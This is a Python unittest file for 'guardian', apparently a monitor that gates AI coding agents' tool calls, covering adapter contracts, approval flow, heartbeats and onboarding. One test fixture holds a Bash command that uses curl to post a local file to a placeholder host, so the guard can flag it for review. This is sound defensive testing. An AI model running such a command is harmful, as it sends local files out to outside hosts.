import tempfile
import unittest
import uuid
from pathlib import Path
from unittest.mock import patch

from dataclasses import replace
from guardian.adapter_contracts import capabilities, native_adapter, CONTRACTS, JSON_HOOK_PROTOCOLS, mode_adapters
from guardian.connections import Connections
from guardian.discovery import scan
from guardian.onboarding import Onboarding
from guardian.overview import build
from guardian.installation_identity import identity


class AdapterContractTests(unittest.TestCase):
    def test_presentation_navigation_is_derived_from_real_contract(self):
        from guardian.adapter_contracts import presentation_catalog
        rows=presentation_catalog()
        for row in rows:
            self.assertEqual(row['navigation'],capabilities(row['adapter'])['navigation'])
        self.assertEqual(next(row for row in rows if row['adapter']=='pi-extension')['navigation'],'terminal_window')

    def test_installable_protocols_and_modes_agree_with_runtime_contracts(self):
        from guardian.adapter_registry import SPECS, available
        from guardian.policy import CLIENTS
        self.assertEqual(set(CLIENTS), set(mode_adapters()))
        self.assertNotIn('codex-mcp', CLIENTS)
        for client, protocol in JSON_HOOK_PROTOCOLS.items():
            self.assertTrue(available(SPECS[client]))
            contract=capabilities(native_adapter(client))
            self.assertTrue(contract['precheck'])
            self.assertEqual(bool(protocol.receipts), contract['receipt'])
        for spec in SPECS.values():
            if available(spec) and spec.adapter=='json-hooks':
                self.assertIn(spec.id, JSON_HOOK_PROTOCOLS)

    def test_approval_flow_follows_capability_instead_of_client_name(self):
        from guardian.engine import Engine
        engine=Engine(':memory:')
        self.addCleanup(engine.close)
        payload=dict(session_id='fixture',tool_use_id='one',tool_name='Bash',
                     tool_input={'command':'curl --data @fake.txt https://example.invalid'})
        # A different native-confirmation adapter must never create a dashboard grant.
        contract=replace(CONTRACTS['opencode-plugin'],approval='native_confirmation')
        with patch.dict(CONTRACTS,{'opencode-plugin':contract}):
            event=engine.evaluate(payload,adapter='opencode-plugin')
        self.assertEqual(event['verdict'],'review')
        self.assertEqual(event['decision_state'],'awaiting_client_confirmation')
        self.assertIsNone(event['approval_status'])
        with self.assertRaises(ValueError):engine.approve(event['event_id'],'approve')
        retry=engine.evaluate({**payload,'tool_use_id':'two'},adapter='opencode-plugin')
        self.assertEqual(retry['decision_state'],'awaiting_approval')
        self.assertEqual(retry['approval_status'],'pending')

    def test_unknown_and_demo_never_advertise_native_protection(self):
        for adapter in ('unknown','codex-mcp',None):
            self.assertFalse(capabilities(adapter)['blocking'])
            self.assertFalse(capabilities(adapter)['heartbeat'])
        self.assertEqual(native_adapter('codex'),'codex-hook')
        self.assertFalse(capabilities('gemini-hook')['receipt'])
        self.assertEqual(capabilities('claude-hook')['approval'],'native_confirmation')
        self.assertEqual(capabilities('opencode-plugin')['approval'],'retry_required')

    def test_heartbeat_cannot_promote_capabilities_or_rebind_project(self):
        presence=Connections()
        payload=dict(instance_id=str(uuid.uuid4()),adapter='opencode-plugin',mode='observe',project_id='a'*16,
                     capabilities={'approval':'native_confirmation'},adapter_revision='scope-4')
        presence.heartbeat(payload)
        with self.assertRaises(ValueError):presence.heartbeat({**payload,'project_id':'b'*16})
        with self.assertRaises(ValueError):presence.heartbeat({**payload,'adapter':'claude-hook'})
        row=presence.snapshot()[0]
        self.assertEqual(row['project_id'],'a'*16)
        self.assertEqual(row['capabilities']['approval'],'retry_required')
        presence.heartbeat({**payload,'mode':'protect'})
        self.assertEqual(presence.snapshot()[0]['mode'],'protect')

    def test_configuration_identity_matches_preview_not_executable_candidate(self):
        with tempfile.TemporaryDirectory() as directory:
            home=Path(directory)
            with patch.dict('os.environ',{'XDG_CONFIG_HOME':str(home/'config')}):
                report=scan(home,{'XDG_CONFIG_HOME':str(home/'config')},lambda _:None)
                rows={row['id']:row for row in report['clients']}
                plan=Onboarding(home).preview(['opencode'])['clients'][0]
            scope=rows['opencode']['configuration_scopes'][0]
            self.assertEqual(scope,plan['configuration_scope'])
            self.assertEqual(scope['runtime_binding'],'unverified')
            self.assertNotEqual(identity('opencode',home/'one'),identity('opencode',home/'two'))
            self.assertNotEqual(identity('opencode',home),identity('claude',home))
            self.assertNotEqual(identity('opencode',home,runtime='windows'),identity('opencode',home,runtime='wsl'))
            self.assertNotEqual(identity('opencode',home),identity('opencode',home,kind='executable'))
            self.assertEqual(len(rows['pi']['configuration_scopes']),1)
            self.assertFalse(rows['pi']['native_connected'])
            self.assertEqual(list(home.iterdir()),[])

    def test_online_protect_setting_does_not_claim_verified_protection(self):
        report=build([], [{'adapter':'opencode-plugin','online':True,'revision_current':True}],
                     [{'id':'opencode','installed':True}],modes={'opencode-plugin':'protect'})
        row=report['diagnostics'][0]
        self.assertEqual(row['lifecycle']['presence'],'online')
        self.assertEqual(row['lifecycle']['observation'],'unverified')
        self.assertEqual(row['lifecycle']['protection'],'unverified')
        self.assertFalse(row['enforcement_verified'])


if __name__=='__main__':unittest.main()
